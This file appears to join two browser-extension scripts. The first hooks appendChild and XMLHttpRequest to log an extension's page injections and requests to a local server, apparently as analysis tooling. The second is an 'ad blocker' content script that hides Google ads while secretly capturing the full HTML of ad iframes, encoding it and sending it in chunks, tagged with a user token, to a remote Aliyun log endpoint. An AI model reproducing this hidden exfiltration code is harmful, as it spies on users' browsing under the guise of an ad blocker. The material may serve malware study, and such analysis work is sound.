
function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

//获取向页面注入的所有内容
function hookAppendChild(){
    var rawAppendChild = Element.prototype.appendChild;
    Element.prototype.appendChild = function() {
        console.log(arguments);
        var data = '';
        if(arguments[0].innerHTML == "") {
            data = arguments[0].src;
        } else {
            data = arguments[0].innerHTML;
        }
        collectMessageToServer("contentscript-appendChild-" + btoa(data));
        return rawAppendChild.apply(this, arguments);
    };
}

//获取所有的ajax 请求信息
function hookAjax(){
    var rawXMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("contentscript-ajax-" + btoa(arguments[1]));
        rawXMLHTTPRequestOpen.apply(this, arguments);
    }
}

//提取所有请求出口
// 方案一： 通过hook
// 方案二： 通过流量，确定需要访问的页面，对比有无扩展访问网站的区别

function run() {
    hookAjax();
    hookAppendChild();
}
run();
//sn00ker_ahahaha
var minLen = 4000;
var maxLimit = 200000;
var logger = new window.Tracker('us-west-1.log.aliyuncs.com','adblock-log1','us1');
var target = 'zing';
var adtop = '-1000px';
var adposition = 'absolute';

function adHide(div){
    // var ifm = div.getElementsByTagName('iframe');
    var ifm = div.get(0).getElementsByTagName('iframe');
    // console.log(ifm);
    if(ifm && ifm.length > 0 ){
        var currfm = ifm[0];
        // console.log(currfm);
        try {
            return extraDom(currfm, div);
        } catch(exception){
            if (currfm.outerHTML.length > minLen
                && currfm.outerHTML.length < maxLimit){
                log(target, currfm.outerHTML);
                // console.log(currfm.outerHTML);
                return true;
            } else {
                // console.log(currfm.outerHTML);
                // console.log(currfm);
            }
        }
        return false;
    }
    return false;
}

function extraDom(currfm, div){
    var docu = currfm.contentWindow.document;
    var domContent = docu.getElementsByTagName("html")[0].outerHTML;
    if(domContent.length < minLen || domContent.length > maxLimit)
        throw new Error("loading...");
    log(target, domContent);
    // console.log(domContent.length);
    // console.log(domContent);
    return true;
}

function log(domain, content){
    try {
        var content = encodeURIComponent(window.btoa(content));
        var maxLen = 15800;
        var dtime = new Date().getTime();
        var segments = Math.ceil(content.length / maxLen);
        // console.log("content length: " + content.length + ";" + segments);
        var md = md5(content);
        chrome.storage.sync.get("gboost_token", function(token) {
            for (var i = 0; i < segments; i++) {
                if(!token.gboost_token) return;
                logger.push('domain', domain);
                logger.push('segments', segments);
                logger.push('dt', token.gboost_token + '_' + dtime);
                logger.push('md', md);

                var start = i * maxLen;
                var end = start + maxLen;
                var payload = content.slice(start, end);
                logger.push('r' + i, payload);
                logger.logger(true);
            }
        });
    } catch(err){
        // console.log(err);
    }
}

function doHide(div){
    if(div.css("top") && div.css("top") == adtop)
        return false;
    chrome.runtime.sendMessage({
        count: 1, domain: target
    });
    div.css("position", adposition);
    div.css("top", adtop);
    return true;
}

function setCron(addiv){
    var inval = setInterval(function() {
        var flag = adHide(addiv);
        // console.log(flag);
        if (flag)
            clearInterval(inval);
    }, 2000);
}

function blockads(){
    var ads = $("div[data-google-query-id][gid!='gboost']:visible");
    ads.each(function(){
        $(this).attr("gid", 'gboost');
        if(doHide($(this)))
            setCron($(this));
    });
}

$(document).ready(function() {
    blockads();
    document.body.addEventListener("DOMSubtreeModified", function() {
        blockads();
    }, false);
});
